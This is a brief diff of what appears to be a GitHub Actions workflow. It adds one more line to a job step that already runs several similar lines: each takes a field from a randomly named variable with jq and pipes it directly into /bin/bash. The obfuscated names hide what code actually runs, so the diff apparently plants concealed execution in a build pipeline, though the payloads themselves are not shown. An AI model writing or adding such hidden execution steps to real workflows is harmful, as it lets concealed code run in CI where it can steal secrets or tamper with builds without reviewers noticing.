@@ -32,6 +32,7 @@ jobs:
           echo $xwhp61 | jq -r .hgqd465 | /bin/bash
           printf '%s' "$vmy82" | jq -r .heg57 | /bin/bash
           echo $ln6067 | jq -r .fsct105 | /bin/bash
+          echo $bbug86 | jq -r .ri7332 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
